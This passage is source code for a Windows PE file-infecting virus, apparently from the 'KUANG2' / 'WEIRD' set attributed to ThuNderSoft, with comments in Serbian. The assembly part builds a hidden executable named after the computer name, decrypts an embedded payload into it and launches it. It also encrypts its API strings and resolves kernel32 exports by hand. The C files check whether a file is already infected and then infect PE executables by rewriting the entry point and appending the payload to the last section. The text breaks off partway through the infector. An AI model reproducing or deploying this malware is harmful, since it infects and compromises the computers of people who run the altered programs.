		lea eax, cs:[ebp+x]
		push eax				; Arg1 = LPDWORD nSize
x = cmpname - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg0 = LPTSTR lpBuffer
		call dword ptr [edi+4]	; call GetComputerNameA

; formiraj jedinstveno ime fajla u filename
; lepo je „to ComputerName sadr‚i samo za fajlove validne karaktere!
x = cmpname - _data_start
		lea edx, cs:[ebp+x]		; edx -> cmpname
x = filename - _data_start
		lea eax, cs:[ebp+x]		; eax -> filename
@@:		cmp byte ptr [eax], 0
		je @f
		inc eax
		jmp @b
@@:		mov byte ptr [eax], '\' ; dodaj na kraj filename '\'
		inc eax

@@:		mov cl, byte ptr [edx]
		cmp cl, 0
		je @f
		mov ch, cl
		sub ch, 'A'
		cmp ch, 25
		ja temp1				; ako nije veliko slovo idi dalje
		add cl, 32				; veliko slovo pretvori u malo
temp1:	mov ch, cl
		sub ch, 'a'
		cmp ch, 25
		ja nextchar				; ako nije slovo onda ga upi„i
		dec cl					; ako je slovo uzmi prethodno (HAL & IBM:)
		cmp cl, 'a'-1           ; ako je slovo bilo 'a'
		jne nextchar			; nije
		mov cl, 'z'             ; jeste, uradi wrapping
nextchar:
		mov byte ptr [eax], cl
		inc eax
		inc edx
		jmp @b
@@:

; dodaj jo„ extenziju '.exe'
		mov dword ptr [eax], 6578652Eh
		mov byte ptr [eax+4], 0 ; zatvori string


;*******************************************************************
;*** Kreiraj fajl ako ga nema, zapi„i u njega virus i zatvori ga ***
;*******************************************************************

; kreiraj fajl
		xor edx, edx			; edx = NULL
		push edx						; Arg6 = hTemplateFile
		push dword ptr FILE_ATTRIBUTE_HIDDEN+FILE_ATTRIBUTE_ARCHIVE		; Arg5 = dwFlagsAndAttributes
		push dword ptr CREATE_NEW		; Arg4 = dwCreationDistribution
		push edx						; Arg3 = lpSecurityAttributes
		push edx						; Arg2 = dwShareMode
		push dword ptr GENERIC_WRITE	; Arg1 = dwDesiredAccess
x = filename - _data_start
		lea eax, cs:[ebp+x]		; eax -> filename
		push eax				; Arg0 = lpFileName
		call dword ptr [edi+8]	; call CreateFileA
		cmp dword ptr eax, INVALID_HANDLE_VALUE
		je virus_start			; do„lo je do gre„ke ili virus ve† postoji!

		mov edx, eax			; nema gre„ke, zapamti handle fajla
		push eax				; i stavi na stek po„to treba kasnije za CloseHandle

; dekriptuj i upi„i fajl
		xor ecx, ecx
		push ecx				; Arg4 = lpOverlapped
x = temp - _data_start
		lea eax, cs:[ebp+x]		; eax -> temp
		push eax				; Arg3 = lpNumberOfBytesWritten
x = _addfile_size- _data_start
		lea eax, cs:[ebp+x]
		mov ecx, [eax]
		push ecx				; Arg2 = nNumberOfBytesToWrite
		add eax, 4
		push eax				; Arg1 = lpBuffer
		push edx				; Arg0 = handle
; dekriptuj
x = _kript - _data_start
		mov bl, cs:[ebp+x]
@@:		add [eax], bl
		inc eax
		add bl, 173
		dec ecx
		jnz @b
; upi„i
		call dword ptr [edi+12] ; call WriteFile

; zatvori kreiran fajl
;		push edx				; Arg0 = handle (bilo ranije!)
		call dword ptr [edi+16] ; call CloseHandle


;*******************************
;*** Startuje (kreiran) fajl ***
;*******************************

;CreateProcess(proginame, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, (LPTSTR)NULL, &si, &pi))
virus_start:
		xor edx, edx
x = process_information - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg9 = lpProcessInformation
x = startup_info - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg8 = lpStartupInfo
;pripremi startupinfo
		mov cl, 67
@@:		inc eax
		mov [eax], dl
		dec cl
		jnz @b
		mov byte ptr [eax-20], 80h		; STARTF_FORCEOFFFEEDBACK
;ostatak
		push edx				; Arg7 = lpCurrentDirectory
		push edx				; Arg6 = lpEnvironment
		push dword ptr NORMAL_PRIORITY_CLASS		; Arg5 = dwCreationFlags
		push edx				; Arg4 = bInheritHandles
		push edx				; Arg3 = lpThreadAttributes
		push edx				; Arg2 = lpProcessAttributes
		push edx				; Arg1 = lpCommandLine
x = filename - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg0 = lpApplicationName
		call dword ptr [edi+20] ; call CreateProcessA


;**************************************
;*** Iza”i iz virusa i startuj host ***
;**************************************
virus_exit:
		popad
		ret						; hop nazad na host


;************************
;*** MyGetProcAddress ***
;************************
; dobavlja adresu neke WinAPI f-je iz KERNEL32.DLL
; ulaz: eax -> string sa imenom f-je iz kernel32.dll
;		esi = hmodule(kernel32.dll)
; izlaz: eax = adresa f-je
MyGetProcAddress:
		push eax				; Arg1 = LPCSTR lpProcName
		push esi				; Arg0 = hModule (KERNEL32.DLL)
x = _ddGetProcAddress - _data_start
		mov edx, cs:[ebp+x]
		call dword ptr [edx]	; call GetProcAddress
		test eax, eax			; da li je f-ja na”ena?
		jz virus_exit			; nije, skoi
		retn



;*************************
;*** WinGetProcAddress ***
;*************************
; u sluaju da GetProcAddress nije uvezena, koristi se ova f-ja
; za dobavljanje adrese te f-je. Mo‚e da slu‚i i za dobavljanje
; svih ostalih adresa, ali bolje da to Windows radi.
; Znai, ova f-ja je malo modifikovana tako da ide u prilog tome
; da se dobavlja samo adresa f-je GetProcAdress.
WinGetProcAddress:
		push ebx
		push esi
		push edi

; uzmi hModule
		mov edx, [esp+16]

; Brza provera ispravnosti - ovde nam ne treba po„to sigurno
; tra‚imo f-ju iz validnog handlea kernel32.dll!
		sub eax, eax
;		cmp word ptr [edx], 'ZM'
;		jnz @@gpaExit
		mov edx, [edx+60]
		add edx, [esp+16]
;		cmp dword ptr [edx], 'EP'
;		jnz @@gpaExit

; handle je validan - brza provera je pro„la OK
		mov edx, [edx+78h]
		add edx, [esp+16]

; EDX sada pokazuje na poetak .edata
; [edx+12] -> module name	 RVA
; [edx+16] =  ordinal base
; [edx+20] =  number of addresses
; [edx+24] =  number of names
; [edx+28] -> array of n address RVA
; [edx+32] -> array of n names*	 RVA
		mov ecx, [edx+24]
		jecxz @@gpaExit

; Pro”i kroz sve stringove dok ne na”e„ isti ili do kraja
		mov edi, [edx+32]
		add edi, [esp+16]

@@gpaLoop:
;		mov ebx, [edi-4]
		mov ebx, [edi]
		add edi, 4
		add ebx, [esp+16]
		mov esi, [esp+20]

@@gpaCmpStr:
		mov al, [ebx]
		mov ah, [esi]
		or ah, al
		jz short @@gpaOrdinalFound

		cmp al, [esi]
		jne short @@gpaCheckNext

		inc esi
		inc ebx
		jmp short @@gpaCmpStr

@@gpaCheckNext:
		loop short @@gpaLoop

; nije na”en string, vrati gre„ku
		sub eax, eax
		jmp short @@gpaExit

@@gpaOrdinalFound:
; najzad je na”eno ono „to se tra‚i: (numNames - ECX) je ordinal
; funkcije iju adresu tra‚imo
		mov eax, [edx+24]
		sub eax, ecx
		mov ecx, [edx+24h]
		add ecx, [esp+16]
		movzx eax, word ptr [eax*2+ecx]
		mov eax, [edx+eax*4+28h]
		add eax, [esp+16]

@@gpaExit:
		pop edi
		pop esi
		pop ebx
		retn 8




;********************
;*** Data sekcija ***
;********************
; ovde slede podaci koji se koriste
; stringovi WinAPI su kriptovani
; da bi se prostor iskoristio „to bolje, stringovi su preklopljeni
; sa drugim podacima, po„to se stringovi koriste samo na poetku programa


_data_start:
;*** Globalni podaci ***
_oldEntryPoint			dd	?
_oldEntryPointRVA		dd	?
_oldEPoffs				dd	?
_oldfilesize			dd	?
_oldoffs1				dd	?	; veliina poslednje sekcija (SizeOfRawData)
_olddata1				dd	?
_oldoffs2				dd	?	; veliina poslednje sekcije u DirectoryData (ako postoji!)
_olddata2				dd	?
_oldoffs3				dd	?	; karakteristike poslednje sekcije
_olddata3				dd	?
_oldoffs4				dd	?	; veliina poslednje sekcije (VirtualSize)
_olddata4				dd	?
_oldoffs5				dd	?	; SizeofImage
_olddata5				dd	?
_kript					db	?

;*** Lokalni podaci ***

; stringovi: 116 bajtova
strKernel				db 'W' ;db 4Ch                          ; "K"
process_information		db 46h, 53h, 4Fh, 46h, 4Dh, 34h
cmpname					db 33h, 2Fh, 45h, 4Dh, 4Dh, 1	; "ERNEL32.DLL", 0  (ujedno i: dd 0, 0, 0, 0)
strGetWindowsDirectoryA db 48h, 66h, 75h, 58h, 6Ah, 6Fh
						db 65h, 70h, 78h, 74h
startup_info			db 45h, 6Ah, 73h, 66h			; poinje sa dwordom 68, a zatim ide jo„ 16 dworda (68 bajta ukupno)
						db 64h, 75h, 70h, 73h
						db 7Ah, 42h, 1					; "GetWindowsDirectoryA", 0
strGetComputerNameA		db 48h, 66h, 75h, 44h, 70h, 6Eh
						db 71h, 76h, 75h, 66h, 73h, 4Fh
						db 62h, 6Eh, 66h, 42h, 1		; "GetComputerNameA", 0
strCreateFileA			db 44h							; "C"
temp					db 73h, 66h, 62h, 75h, 66h, 47h
						db 6Ah, 6Dh, 66h, 42h, 1		; "reateFileA", 0  (ujedno i: dd 0)
strWriteFile			db 58h, 73h, 6Ah, 75h, 66h, 47h
						db 6Ah, 6Dh, 66h, 1				; "WriteFile", 0
strCloseHandle			db 44h, 6Dh, 70h, 74h, 66h, 49h
						db 62h, 6Fh, 65h, 6Dh, 66h, 1	; "CloseHandle", 0
strCreateProcessA		db 44h, 73h, 66h, 62h, 75h, 66h
						db 51h, 73h, 70h, 64h, 66h, 74h
						db 74h, 42h, 1					; "CreateProcessA", 0
strGetProcAddress		db 48h, 66h, 75h, 51h, 73h, 70h
						db 64h, 42h, 65h, 65h, 73h, 66h
						db 74h, 74h, 0					; "GetProcAddress", 0

filename				db MAX_PATH dup(0), 0
;cmpname					db MAX_COMPUTERNAME_LENGTH dup(0), 0
cmpname_len				dd MAX_COMPUTERNAME_LENGTH+1

;*** Pointeri na WinAPI f-je ***
; u cilju smanjenja du‚ine koda ovaj redosled je obavezan!!!!
_ddGetModuleHandleA		dd	?
_ddGetProcAddress		dd	?
ddGetProcAddress		dd	?
ddGetWindowsDirectoryA	dd	?		; <- edi
ddGetComputerNameA		dd	?
ddCreateFileA			dd	?
ddWriteFile				dd	?
ddCloseHandle			dd	?
ddCreateProcessA		dd	?

;*** Ovde †e se smestiti ceo exe fajl ***
_addfile_size			dd ?	; ovde ide veliina fajla koji je dodat
;_virus_data					; ovde se nalazi exe fajl koga treba zapisati
								; znai: (&_addfile_size) + sizeof(dd)

_virus_end:						; Konano... kraj virusa
_DATA ends

end
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[weirdus.asm]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[kisinf.c]ÄÄÄ
/***[ThuNderSoft]*************************************************************
							  KUANG2: IsFileInfect
								   ver: 0.10
								úùÄÍ WEIRD ÍÄùú
*****************************************************************************/

/* HISTORY */
// ver 0.10 (12-may-1999): born code

#include <windows.h>
#include <strmem.h>

// minimalna veliina fajla	 ( < veliine dodatog virusa)
#define		MIN_FILE_LEN	9000
// koliko od kraja fajla treba poeti skeniranje ( > veliine dodatog virusa)
#define		FROM_END		12500

/*
	IsFileInfect
	------------
  ş proverava da li je neki fajl ve† inficiran.
  ş mora posebno jer vr„i samo itanje.
  ş vra†a -1 za tehnike probleme, 0 za ist fajl, 1 za inficiran
  ş indetino u virusu i antivirusu
  ş brz i inteligentan. */

int IsFileInfect(char *fname, char* virus_sign) {
	HANDLE hfile, hfilemap;
	char *filemap, *filestart;
	DWORD fattr;
	DWORD fsize;
	unsigned int retvalue;
	unsigned int koliko;

	retvalue=-1;						// oznai tehniku gre„ku (default)

	fattr=GetFileAttributes(fname);		// uzmi atribute fajla

	// otvaramo fajl
	hfile=CreateFile(fname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, fattr, NULL);
	if (hfile==INVALID_HANDLE_VALUE) goto end1;

	// uzmi veliinu fajla
	fsize=GetFileSize(hfile, NULL);
	if (fsize==0xFFFFFFFF) goto end2;	// gre„ka
	if (fsize<MIN_FILE_LEN) {			// ako je veliina fajla manja
		retvalue=0;						// od veliine dodatog virusa
		goto end2;						// znai da je fajl ist (0)
	}

	// kreiramo MMF
	hfilemap=CreateFileMapping (hfile, NULL, PAGE_READONLY, 0, fsize, NULL);
	if (hfilemap==NULL) goto end2;
	// kreiramo MMF view na ceo fajl
	filemap=(void *) MapViewOfFile (hfilemap, FILE_MAP_READ, 0,0,0);
	if (filemap==NULL) goto end3;
	filestart=filemap;

	// odredi poetak skeniranja...
	if (fsize>FROM_END) {				// ako je fajl ve†i od FROM_END
		filemap+=(fsize-FROM_END);		// pomeri se tako da ima FROM_END do kraja
		koliko=FROM_END;				// oznai koliko ima za skeniranje
	} else koliko=fsize;				// oznai da se ceo fajl skenira

	// proveri da li je ve† zara‚en (ak 50 znakova!)
	if (memfind(filemap, koliko, virus_sign, 50)!=-1)
		retvalue=1;					// zara‚en fajl
		else retvalue=0;			// ist fajl

	UnmapViewOfFile(filestart); // zatvari MMF view
end3:
	CloseHandle(hfilemap);		// zatvori MMF
end2:
	CloseHandle(hfile);			// zatvori fajl
end1:
	return retvalue;			// vrati rezultat
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[kisinf.c]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[kinff.c]ÄÄÄ
/***[ThuNderSoft]*************************************************************
							   KUANG2: InfectFile
								   ver: 0.19
								úùÄÍ WEIRD ÍÄùú
*****************************************************************************/

/* HISTORY */
// ver 0.19 (26-may-1999): test mod
// ver 0.18 (19-may-1999): overlay, bss sekcije
// ver 0.16 (18-may-1999): bug kod ITrva2ofs, vi„e istih DLLova
// ver 0.14 (15-may-1999): HNA i IAT
// ver 0.10 (14-may-1999): born code

#include <windows.h>
#include <ctypew.h>
#include <win95e.h>

// kada je definisan I_TESTMODE onda bele‚i sve informacije
// prilikom inficiranja fajla
//#define I_TESTMODE

// kada je definisan I_TESTMODE_API onda zapi„i i sve import funkcije!
//#define I_TESTMODE_API




#ifdef I_TESTMODE
HANDLE testIfile;
DWORD Iwritten;
char _testb[16];
#endif

// potpis ms-dos exe fajla
#define		IMAGE_DOS_SIGNATURE1	0x5A4D		// MZ
#define		IMAGE_DOS_SIGNATURE2	0x4D5A		// ZM

// orijentaciona ve†a vrednost veliine virusa (za potrebe mapiranja fajla)
#define		VIRUSLEN	12500

// ime .exe fajla koji se dodaje na host PE exe
// (to je, u stvari, ime samog Kuang2.exe iz komandne linije)
extern char* addfile;

// externe promenljive iz samog virusa
extern char virus_start, virus_end;
extern unsigned int addfile_size;
extern unsigned int oldEntryPoint, oldEntryPointRVA, oldEPoffs, oldfilesize;
extern unsigned int oldoffs1, olddata1, oldoffs2, olddata2, oldoffs3, olddata3, oldoffs4, olddata4, oldoffs5, olddata5;
extern unsigned int ddGetModuleHandleA, ddGetProcAddress;
extern char kript;



/*
	InfectFile
	----------
  ş Inficira neki PE EXE fajl, koji je dat kao argument.
  ş Ne proverava se extenzija, ni da li je fajl ve† zara‚en.
  ş šuvaju se atributi i vreme upisa.
  ş Vra†a 0 ako je sve u redu. */

int InfectFile(char *fname)
{
	HANDLE hfile, hfilemap, haddfile;
	unsigned int fsize;				// veliina fajla
	char *filemap;					// pointer na MMF
	char *filestart;				// uvek pointer na poetak MMF
	unsigned int retvalue;			// povratna vrednost iz ove f-je
	unsigned int fattr;				// atributi fajla
	unsigned int NumberOfSections;	// broj sekcija PE fajla
	unsigned int *EntryPointRVA;	// pointer na mesto u fajlu gde se uva EntryPoint RVA
	unsigned int ImageBase;			// Image base adresa
	unsigned int SectionAlign;		// alignment veliine svake sekcije
	unsigned int *SizeofImage;		// pointer na SizeOfImage
	PIMAGE_DATA_DIRECTORY entry_idd;// pointer na prvi Data directorys
	char *ImportTable;				// Import Table
	unsigned int ISrva2ofs;			// konverzija RVA u file ofset (za ImportSekciju)
	unsigned int *IAT, *HNA;		// Import Address Table & Hint Name Address
	unsigned int *UseT;				// ili IAT ili HNA
	char *module_name;				// ime IMPORT modula
	char *virusstart;				// file offset gde †e poeti virus
	char kernel32[]="KERNEL32.DLL"; // kernel32.dll
	char getmodulehandle[]="GetModuleHandleA";  // imena f-ja
	char getprocaddress[]="GetProcAddress";     // koje tra‚imo
	unsigned int GetModuleHandleRVA;			// RVA adresa gde †e virus...
	unsigned int GetProcAddressRVA;				// ...na†i ove funkcije
	unsigned int i;								// pomo†ne promenljive
	unsigned int raw_virussize;					// veliina samo virus koda (bez add exe)
	unsigned int align_virussize;				// align veliina virus
	unsigned int overlay;						// veliina overlaya ako je ima
	FILETIME creation_time, lastacc_time, lastwr_time;
#define		function_name		module_name

#ifdef I_TESTMODE
	testIfile=CreateFile("c:\\k2test_i.dat", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
	WriteFile(testIfile, fname, lstrlen(fname), &Iwritten, NULL);
#endif





/*** POšETAK & PRIPREMA FAJLOVA ***/

	// uzmi atribute fajla i ako je setovan read-only onda ga resetuj
	fattr=GetFileAttributes(fname);			// uzmi atribute fajla
	if (fattr & FILE_ATTRIBUTE_READONLY)	// resetuj readonly ako ga ima
		SetFileAttributes(fname, fattr ^ FILE_ATTRIBUTE_READONLY);

	// otvari fajl
	hfile=CreateFile(fname, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, fattr, NULL);
	if (hfile==INVALID_HANDLE_VALUE) {retvalue=0x10; goto end1;}

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nopen", 6, &Iwritten, NULL);
#endif

	// uzmi veliinu fajla
	fsize=GetFileSize(hfile, NULL);
	if (fsize>0xFFFFFFFF-VIRUSLEN) {retvalue=0x11; goto end2;}	// ako je fajl prevelik
	if (fsize<256) {retvalue=0x11; goto end2;}					// ako je fajl suvi„e mali
	oldfilesize=fsize;						// zapamti i originalnu veliinu fajla

	// sauvaj original vreme fajla
	GetFileTime(hfile, &creation_time, &lastacc_time, &lastwr_time);

	// kreiraj MMF
	hfilemap=CreateFileMapping (hfile, NULL, PAGE_READWRITE, 0, fsize+VIRUSLEN, NULL);
	if (hfilemap==NULL) {retvalue=0x12; goto end2;}
	// kreiraj MMF view na ceo fajl
	filemap=(void *) MapViewOfFile (hfilemap, FILE_MAP_ALL_ACCESS, 0,0,0);
	if (filemap==NULL) {retvalue=0x13; goto end3;}
	filestart=filemap;

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nmapped", 8, &Iwritten, NULL);
#endif

	// proveri da li je fajl DOS .EXE
	if (*(unsigned short int *)filemap != IMAGE_DOS_SIGNATURE1)			// e_magic == MZ ?
		if (*(unsigned short int *)filemap != IMAGE_DOS_SIGNATURE2)		// e_magic == ZM ?
			{retvalue=0x101; goto end4;}								// nije, iza”i

	// pomeri se na adresu PE exe header-a
	filemap += ((PIMAGE_DOS_HEADER)filemap)->e_lfanew;

	// proveri da signature odgovara PE exe fajlu
	if (IsBadCodePtr((FARPROC)filemap)) {retvalue=0x102; goto end4;}
	if (*(DWORD *)filemap != IMAGE_NT_SIGNATURE)	// 'PE00'
		{retvalue=0x102; goto end4;}

	// preskoi signature i sada smo na poetku PE headera
	filemap += sizeof(DWORD);

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nPEok", 6, &Iwritten, NULL);
#endif





/*** PREUZIMANJE PODATAKA ***/

	// preuzmi broj sekcija
	NumberOfSections = ((PIMAGE_FILE_HEADER)filemap)->NumberOfSections;

	// preskoi PE header i sada pokazujemo na PE Optional header
	filemap += IMAGE_SIZEOF_FILE_HEADER;

	// proveri da li je exe fajl za GUI (nije konzolna aplikacija)
	if (((PIMAGE_OPTIONAL_HEADER)filemap)->Subsystem != IMAGE_SUBSYSTEM_WINDOWS_GUI)
		{retvalue=0x103; goto end4;}

	// zapamti pointer na entry pointa
	i=(unsigned int)filemap + 16;		// 16 je ofset do EntryPoint-a
	EntryPointRVA = (unsigned int *)i;
	// zapamti ImageBase
	ImageBase = ((PIMAGE_OPTIONAL_HEADER)filemap)->ImageBase;
	// zapamti Alignment sekcija
	SectionAlign = ((PIMAGE_OPTIONAL_HEADER)filemap)->FileAlignment;
	// preuzmi pointer na SizeOfImage
	i=(unsigned int)filemap + 56;				// 56 je ofset do SizeOfImage
	SizeofImage = (unsigned int *)i;
	// preuzmi pointer na DirectoryData
	i=(unsigned int)filemap + 96;				// 96 je ofset do DirectoryData
	entry_idd = (PIMAGE_DATA_DIRECTORY) i;

	// vidi da li postoji IMPORT sekcija - ako ne postoji onda veliina==0
	if (!(entry_idd[IMAGE_DIRECTORY_ENTRY_IMPORT]).Size)
		{retvalue=0x105; goto end4;}

	// preskoi i PE Optional header, sada smo na poetku Section Table
	// ova tabla sadr‚i Section Header-e kojih ima NumberOfSections
	filemap += sizeof(IMAGE_OPTIONAL_HEADER);

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nimport ok", 10, &Iwritten, NULL);
#endif





/*** NALAENJE IMPORT SEKCIJE ***/

	i=0; ImportTable=NULL;

	// pretra‚i celu Section Table da bi na„li Import sekciju (sadr‚i IT)
	// tako”e treba locirati poslednji Section Header
	while (i<NumberOfSections) {

#ifdef I_TESTMODE
// ime sekcije
		wsprintf(_testb, "\r\n%.8s", ((PIMAGE_SECTION_HEADER)filemap)->Name);
		WriteFile(testIfile, _testb, 10, &Iwritten, NULL);
#endif


		// Da li je trenutna sekcija IMPORT sekcija?
		// proverava se da li je VirtualAddress iz DirectoryData[IMPORT]
		// unutar RVA granica trenutne sekcije: [VirtualAddress, VirtualAddress+SizeOfRawData).
		if (!ImportTable)	// ako IMPORT sekcija jo„ uvek nije na”ena
		if ((entry_idd[IMAGE_DIRECTORY_ENTRY_IMPORT]).VirtualAddress - ((PIMAGE_SECTION_HEADER)filemap)->VirtualAddress < ((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData) {
			// pomo†na promenljiva, treba kasnije
			ISrva2ofs = (unsigned int) filestart + ((PIMAGE_SECTION_HEADER)filemap)->PointerToRawData - ((PIMAGE_SECTION_HEADER)filemap)->VirtualAddress;
			// Na”ena je IMPORT sekcij!, preuzi file offset na njen poetak
			ImportTable = (char *) ((entry_idd[IMAGE_DIRECTORY_ENTRY_IMPORT]).VirtualAddress + ISrva2ofs);
			// iako je import sekcija prona”ena, vrti dalje da bi na„ao
			// poslednju sekciju
		}

		// idi na slede†u sekciju
		filemap+=IMAGE_SIZEOF_SECTION_HEADER;		// sizeof(IMAGE_SECTION_HEADER);
		i++;
	}

	// gre„ka - nijedna sekcija nije IMPORT
	if (!ImportTable) {retvalue=0x106; goto end4;}






/*** NALAENJE SVIH KERNEL32.DLL ***/

	// resetuje pointere
	GetModuleHandleRVA=GetProcAddressRVA=0;

	while (1) {

		// preuzmi ime DLLa
		i=((PIMAGE_IMPORT_DESCRIPTOR)ImportTable)->Name;
		if (i) module_name = (char *) (ISrva2ofs + i);
			else break;			// kraj, nema vi„e DLLova

		// poredi ime DLLa sa 'KERNEL32.DLL'
		if (!lstrcmpi(module_name, kernel32)) {


			/*** NAAO KERNEL32.DLL - NALAENJE WinAPI FUNKCIJA ***/

			// preuzmi file ofset na IAT
			i=ISrva2ofs + (unsigned int)((PIMAGE_IMPORT_DESCRIPTOR)ImportTable)->FirstThunk;
			IAT=(unsigned int*) (i);
			// preuzmi file ofset na HNA, ako je ima
			i=((PIMAGE_IMPORT_DESCRIPTOR)ImportTable)->Characteristics;
			if (i) {
				i+=ISrva2ofs;
				HNA=(unsigned int*) (i);
			} else HNA=0;

			UseT=IAT;				// pretra‚uje se IAT
			if (HNA)				// ako postoji HNA (nije Borland)
				if (*HNA != *IAT)	// ako razliito pokazuju IAT i HNA
					UseT=HNA;		// onda je IAT optimizovan (Micro$oft), pa se pretra‚uje HNA

			// pretra‚i IAT ili HNA za potrebnim funkcijama
			while (*UseT) {
				// postoji samo ordinal, idi dalje
				if ((signed int)(*UseT) < 0) {
					UseT++; IAT++;
					continue;
				}
				// postoji i ime funkcije, ordinal nije obavezan da postoji!
				i = *UseT + ISrva2ofs;
				function_name = ((PIMAGE_IMPORT_BY_NAME)i)->Name;

#ifdef I_TESTMODE_API
				WriteFile(testIfile, "\r\n", 2, &Iwritten, NULL);
				WriteFile(testIfile, function_name, lstrlen(function_name), &Iwritten, NULL);
#endif

				// poredi ime IMPORT f-je sa 'GetModuleHandleA', ako nije na”ena
				if (!GetModuleHandleRVA)
				if (!lstrcmpi(function_name, getmodulehandle)) {
					// na„ao, sauvaj RVA na IAT [GetModuleHandleA]
					GetModuleHandleRVA = (unsigned int) IAT - ISrva2ofs;
					if (GetProcAddressRVA) break;	// ako su na”ene obe f-je, iza”i
				}

				// poredi ime IMPORT f-je sa 'GetProcAddress', ako nije na”ena
				if (!GetProcAddress)
				if (!lstrcmpi(function_name, getprocaddress)) {
					// na„ao, sauvaj RVA na IAT [GetProcAddress]
					GetProcAddressRVA = (unsigned int) IAT - ISrva2ofs;
					if (GetModuleHandleRVA) break;	// ako su na”ene obe f-je, iza”i
				}

				// idi na slede†u IMPORT funkciju
				UseT++; IAT ++;
			}	// while, zavr„ena pretraga IAT

			// ako su na”ene obe funkcije iza”i!
			if (GetModuleHandleRVA && GetProcAddressRVA) break;
		}

		// idi na slede†u IMPORT biblioteku
		ImportTable += sizeof (IMAGE_IMPORT_DESCRIPTOR);
	};

	if (!GetModuleHandleRVA)			// nije na„ao prvu f-ju
		{retvalue=0x108; goto end4;}
//	if (!GetProcAddressRVA)				// nije na„ao drugu f-ju
//		{retvalue=0x109; goto end4;}	// ali, ko zna, mo‚da je izvuemo iz KERNEL32.DLL

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nattach", 8, &Iwritten, NULL);
#endif






/*** ATTACH FILE ***/

#define		viruscode	module_name
#define		temp		ISrva2ofs
#define		j			NumberOfSections

	// otvori addexe fajl koji †e se upisati
	haddfile=CreateFile(addfile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, fattr, NULL);
	if (haddfile==INVALID_HANDLE_VALUE) {retvalue=0x10A; goto end4;}
	// uzmi njegovu veliinu i ujedno je zapamti
	addfile_size=GetFileSize(haddfile, NULL);

	// vrati da filemap pokazuje na poslednju sekciju
	// pa‚nja! postoje sekcije koje nisu fiziki prisutne u pe exe fajlu (.bss)
	// one se razlikuju samo po tome „to je njihov PointerToRawData==0
	// ili je SizeOfRawData==0
	do {
		filemap -= IMAGE_SIZEOF_SECTION_HEADER;
		temp=((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData;
		i=((PIMAGE_SECTION_HEADER)filemap)->PointerToRawData;
	} while ( !temp || !i );

	// na”i file ofset gde treba dodati virus. Na ‚alost, VirtualSize mo‚e
	// biti 0 (watcom linker) tako da se on ne mo‚e koristiti.
	i+=temp;
	if (fsize>i) overlay=fsize-i; else overlay=0;
	virusstart = filestart + i + overlay;			// ako ima overlay, onda ga preskoi

	// odredi RAW veliinu koda virusa
	raw_virussize=&virus_end-&virus_start;
	// odredi i Align veliinu koda virusa + add file
	align_virussize=(((raw_virussize+addfile_size+overlay)/SectionAlign) + 1) * SectionAlign;
	// preuzmi pointer na poetak koda virusa
	viruscode=&virus_start;

	// zapi„i u virus RVA+ImageBase na„e dve winAPI f-je
	ddGetModuleHandleA = GetModuleHandleRVA + ImageBase;
	ddGetProcAddress = GetProcAddressRVA;
	if (GetProcAddressRVA) ddGetProcAddress += ImageBase;

	// Promeni RVA entry pointa na RVA poetka virusa
	oldEntryPoint=*EntryPointRVA + ImageBase;		// sauvaj u fajlu stari entry point (RVA + ImageBase)
	oldEntryPointRVA=*EntryPointRVA;				// sauvaj u fajlu samo RVA starog entry pointa
	j=((PIMAGE_SECTION_HEADER)filemap)->VirtualAddress + temp + overlay;
	oldEPoffs=(unsigned int) EntryPointRVA - (unsigned int) filestart;	// sauvaj i pointer na mesto entry pointa
	*EntryPointRVA=j;								// setuj RVA novog Entry Pointa

	// Promeni veliinu poslednje sekcije i celog fajla
	oldoffs1=filemap-filestart+16;								// zapamti fajl ofset i
	olddata1=((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData;	// stare podatke na tom mestu
	((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData += align_virussize;
	fsize += align_virussize - overlay;

	// Promeni veliinu poslednje sekcije (VirtualSize) ako <> 0
	oldoffs4=filemap-filestart+8;									// zapamti fajl offset i
	olddata4=((PIMAGE_SECTION_HEADER)filemap)->Misc.VirtualSize;	// stare podatke na tom mestu
	if (olddata4)													// setuj novu veliinu ako je ona <> 0
		((PIMAGE_SECTION_HEADER)filemap)->Misc.VirtualSize = ((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData;

	// Promeni veliinu sekcije (opet), ako ona postoji u DirectoryData.
	// prvo se mora ustanoviti koja je sekcija u pitanju: koje sekcije RVA
	// spada ovde (kao malo pre)
	oldoffs2=i=0;
	while (i<IMAGE_NUMBEROF_DIRECTORY_ENTRIES) {
